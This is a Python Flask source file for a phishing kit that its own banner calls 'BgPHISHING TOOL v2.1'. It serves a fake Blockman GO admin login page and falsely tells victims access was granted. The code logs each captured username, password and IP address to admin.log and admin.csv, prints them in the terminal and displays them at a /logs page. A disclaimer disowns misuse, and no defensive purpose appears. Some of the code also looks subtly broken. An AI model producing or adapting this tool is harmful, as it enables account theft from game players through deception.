from flask import Flask, request, jsonify
import datetime
import os
from colorama import init, Fore, Back, Style

# Initialize Colorama
init(autoreset=True)

app = Flask(__name__)

HTML = '''
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BLOCKMAN GO Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px;color:#0f172a}
.header{color:#ff6b35;font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:8px 16px;background:#fff5f5;border-radius:8px;margin-bottom:10px;border:1px solid #ffddd6}
.announce{background:linear-gradient(135deg,#ff6b35,#ff8e53);color:#fff;padding:16px 24px;border-radius:12px;text-align:center;margin-bottom:25px;max-width:500px;width:100%;box-shadow:0 8px 25px rgba(255,107,53,0.15);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.02)}}
.announce h2{font-size:18px;font-weight:700;margin-bottom:5px;text-shadow:0 2px 4px rgba(0,0,0,0.2)}
.announce p{font-size:14px;opacity:0.9;font-weight:500}
.container{max-width:450px;width:100%}
.logo{display:flex;align-items:center;justify-content:center;gap:16px;margin:30px 0}
.logo-badge{width:64px;height:64px;background:linear-gradient(135deg,#ff6b35,#ff8e53);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:800;color:#fff;box-shadow:0 10px 25px rgba(255,107,53,0.2);border:2px solid #ffddd6}
.logo-text{font-size:40px;font-weight:800}
.logo-text span{color:#ff6b35;text-shadow:0 2px 4px rgba(255,107,53,0.3)}
.title{color:#64748b;font-size:17px;text-align:center;margin-bottom:40px}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:20px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,0.05);position:relative}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#ff6b35,#ff8e53)}
.field{margin-bottom:25px}
.label{color:#334155;font-size:14px;font-weight:600;margin-bottom:10px;display:block;text-transform:uppercase}
.input{width:100%;padding:16px;background:#f8fafc;border:2px solid #e2e8f0;border-radius:12px;color:#0f172a;font-size:16px;transition:all 0.2s}
.input:focus{outline:none;border-color:#ff6b35;background:#fff;box-shadow:0 0 0 3px rgba(255,107,53,0.1)}
.verify{background:#fff5f5;border:1px solid #ffddd6;color:#ff6b35;padding:16px;border-radius:10px;text-align:center;margin:25px 0;font-weight:600}
.btn{width:100%;padding:18px;background:linear-gradient(135deg,#ff6b35,#ff8e53);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.2s}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(255,107,53,0.25)}
.links{display:flex;justify-content:space-between;margin-top:30px;padding-top:20px;border-top:1px solid #f1f5f9}
.link{color:#ff6b35;text-decoration:none;font-size:14px;font-weight:500}
.link:hover{color:#ff8e53;text-decoration:underline}
.support{background:#fff5f5;border:1px solid #ffddd6;border-radius:12px;padding:20px;margin-top:30px;text-align:center}
.support h4{color:#ff6b35;font-size:15px;font-weight:700;margin-bottom:10px}
.support p{color:#64748b;font-size:13px;margin-bottom:15px}
.support-btn{background:linear-gradient(135deg,#ff6b35,#ff8e53);color:#fff;padding:12px 28px;border-radius:10px;border:none;font-weight:600;cursor:pointer;transition:all 0.2s}
.support-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,107,53,0.2)}
.footer{color:#64748b;text-align:center;margin-top:40px;font-size:14px}
.alert{position:fixed;top:20px;right:20px;padding:16px 24px;border-radius:12px;color:#fff;font-weight:500;box-shadow:0 10px 30px rgba(0,0,0,0.15);display:none;max-width:350px;animation:slideIn 0.3s}
@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
.success{background:linear-gradient(135deg,#10b981,#059669)}
.error{background:linear-gradient(135deg,#ef4444,#dc2626)}
.info{background:linear-gradient(135deg,#3b82f6,#2563eb)}
.warning{background:linear-gradient(135deg,#ff6b35,#ff8e53)}
.spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 0.8s linear infinite;display:inline-block;margin-right:10px}
@keyframes spin{to{transform:rotate(360deg)}}
@media (max-width:480px){.card{padding:30px 25px}.logo-text{font-size:36px}.logo-badge{width:56px;height:56px;font-size:26px}}
</style>
</head>
<body>
<div class="header">Xnone Blockman Go Hackers</div>
<div class="announce"><h2>✨ NEW ADMIN PANEL FOR BLOCKMAN GO!</h2><p>Support us if you like the panel!!!</p></div>
<div class="container">
<div class="logo"><div class="logo-badge">B</div><div class="logo-text">BLOCKMAN <span>GO</span></div></div>
<div class="title">Admin Panel Login</div>
<div class="card">
<div id="alert" class="alert"></div>
<form id="loginForm">
<div class="field"><label class="label">Enter Username</label><input type="text" class="input" name="username" placeholder="Admin username" required></div>
<div class="field"><label class="label">Enter Password</label><input type="password" class="input" name="password" placeholder="Admin password" required></div>
<div class="verify">Admin verification required</div>
<button type="submit" class="btn" id="btn">ACCESS ADMIN PANEL</button>
</form>
<div class="links"><a href="#" class="link" onclick="showAlert('Password reset requires verification','info')">Forgot Password?</a><a href="#" class="link" onclick="showAlert('Request admin access','info')">Request Access</a></div>
</div>
<div class="support"><h4>❤️ SUPPORT OUR WORK</h4><p>Support Xnone Blockman Go Hackers development</p><button class="support-btn" onclick="showAlert('Thank you for support!','success')">SUPPORT US</button></div>
<div class="footer">blockmango.com/# | Admin Panel v2.1</div>
</div>
<script>
function showAlert(msg,type){let a=document.getElementById('alert');a.textContent=msg;a.className='alert '+type;a.style.display='block';setTimeout(()=>{a.style.display='none'},3000)}
document.getElementById('loginForm').addEventListener('submit',async e=>{
e.preventDefault();let f=new FormData(e.target),u=f.get('username').trim(),p=f.get('password'),b=document.getElementById('btn');
if(!u||!p){showAlert('Enter admin credentials','error');return}
if(u.length<3){showAlert('Username too short','error');return}
if(p.length<6){showAlert('Password too short','error');return}
b.innerHTML='<span class="spinner"></span> VERIFYING...';b.disabled=true;
try{let r=await fetch('/login',{method:'POST',body:new URLSearchParams(f)}),d=await r.json();
if(d.success){showAlert('✓ Admin access granted','success');setTimeout(()=>e.target.reset(),1500)}else{showAlert(d.error||'Failed','error')}
}catch{showAlert('Network error','error')}finally{setTimeout(()=>{b.innerHTML='ACCESS ADMIN PANEL';b.disabled=false},2000)}
})
document.querySelector('input[name="username"]').focus();
setTimeout(()=>showAlert('Welcome to Admin Panel v2.1','warning'),1000);
</script>
</body></html>
'''

def print_logo():
    """Print colored logo"""
    print(Fore.YELLOW + r'''
This tool was made by WastelandX. The author is not responsible for the misuse of this tool, use at your own risk.'' + Fore.RESET)
    
    print(Fore.CYAN + '''
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                    ┃
┃  ░▒▓██████▓▒░  ░▒▓██████▓▒░   ░▒▓██████▓▒░        ┃
┃  ▓▓▒░      ░▒▓▓▓▒░      ░▒▓▓▓▓▒░      ░▒▓▓        ┃
┃  ▒▓▓        ▓▓▒          ▓▓▒          ▓▓▒         ┃
┃  ░▓▓        ▓▓░          ▓▓░          ▓▓░         ┃
┃   ▓▓        ▓▓           ▓▓           ▓▓          ┃
┃   ▓▓▓      ▓▓▓           ▓▓▓         ▓▓▓          ┃
┃    ▒▓▓▓▓▓▓▓▓▒             ▒▓▓▓▓▓▓▓▓▓▓▓▒           ┃
┃                                                    ┃
┃  ╔══════════════════════════════════════════════╗  ┃
┃  ║            BgPHISHING TOOL v2.1             ║  ┃
┃  ║        Blockman GO Credential Capture made by WastelandX       ║  ┃
┃  ╚══════════════════════════════════════════════╝  ┃
┃                                                    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
''' + Fore.RESET)

def print_banner():
    """Print colored banner"""
    print(Fore.MAGENTA + Style.BRIGHT + "═" * 60)
    print(Fore.RED + "🔥 BLOCKMAN GO Phisher v2.1 🔥".center(60))
    print(Fore.MAGENTA + "═" * 60)
    print(Fore.YELLOW + "✨ Phisher for well known BLOCKMAN GO.")
    print(Fore.CYAN + "💡 Support me on github if you like the tool!")
    print()
    print(Fore.GREEN + "🌐 Panel URL:   " + Fore.WHITE + "http://127.0.0.1:5000")
    print(Fore.GREEN + "📁 Log File:    " + Fore.WHITE + "admin.log")
    print(Fore.GREEN + "👁️  View Logs:  " + Fore.WHITE + "http://127.0.0.1:5000/logs")
    print()
    print(Fore.YELLOW + "📊 Capture active - Credentials will appear below")
    print(Fore.MAGENTA + "=" * 60 + Style.RESET_ALL + "\n")

def print_credentials(username, password, ip, time):
    """Print captured credentials with colors"""
    print(Fore.RED + "═" * 60)
    print(Fore.YELLOW + " 🔐 ADMIN CREDENTIALS CAPTURED ".center(60, "═"))
    print(Fore.RED + "═" * 60)
    print(Fore.CYAN + f"   📅 Timestamp:  " + Fore.WHITE + f"{time}")
    print(Fore.CYAN + f"   👑 Username:   " + Fore.GREEN + f"{username}")
    print(Fore.CYAN + f"   🔑 Password:   " + Fore.RED + f"{password}")
    print(Fore.CYAN + f"   🌐 IP Address: " + Fore.MAGENTA + f"{ip}")
    print(Fore.RED + "═" * 60 + Style.RESET_ALL + "\n")

@app.route('/')
def home():
    return HTML

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        if not username or not password:
            return jsonify({'success': False, 'error': 'Credentials required'}), 400
        
        ip = request.remote_addr
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Print colored credentials
        print_credentials(username, password, ip, time)
        
        # Save to file
        with open("admin.log", "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Timestamp: {time}\n")
            f.write(f"Username:  {username}\n")
            f.write(f"Password:  {password}\n")
            f.write(f"IP:        {ip}\n")
            f.write(f"{'='*50}\n")
        
        # Also save to CSV
        with open("admin.csv", "a", encoding="utf-8") as f:
            if os.path.getsize("admin.csv") == 0:
                f.write("Timestamp,Username,Password,IP Address\n")
            f.write(f'"{time}","{username}","{password}","{ip}"\n')
        
        return jsonify({
            'success': True,
            'message': 'Admin verified',
            'time': time
        })
        
    except Exception as e:
        print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL)
        return jsonify({'success': False, 'error': 'Server error'}), 500

@app.route('/logs')
def logs():
    """View captured data"""
    try:
        with open("admin.log", "r", encoding="utf-8") as f:
            data = f.read()
        return f'''
        <html><body style="background:#fff;padding:20px;font-family:monospace">
        <h2 style="color:#ff6b35">📊 Admin Credentials Log</h2>
        <pre style="background:#f8fafc;padding:20px;border-radius:10px;border:1px solid #ffddd6">{data}</pre>
        </body></html>
        '''
    except:
        return '''
        <div style="padding:30px;text-align:center">
        <h2 style="color:#64748b">No logs yet</h2>
        <p style="color:#94a3b8">Admin credentials will appear here</p>
        </div>
        '''

if __name__ == '__main__':
    # Clear terminal
    os.system('clear' if os.name != 'nt' else 'cls')
    
    # Install colorama if not installed
    try:
        import colorama
    except ImportError:
        print("Installing Colorama...")
        os.system("pip install colorama --quiet")
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
    
    # Print logo and banner
    print_logo()
    print_banner()
    
    # Create log files if they don't exist
    if os.path.exists("admin.log"):
        with open("admin.log", "r", encoding="utf-8") as f:
            lines = f.readlines()
            count = sum(1 for line in lines if "Username:" in line)
            if count > 0:
                print(Fore.GREEN + f"📊 Previously captured: {count} admin credentials" + Style.RESET_ALL)
                print(Fore.YELLOW + "Last capture:" + Style.RESET_ALL)
                if len(lines) > 10:
                    for line in lines[-10:]:
                        if line.strip():
                            print(Fore.CYAN + "  " + line.strip() + Style.RESET_ALL)
                print()
    
    app.run(host='127.0.0.1', port=5000)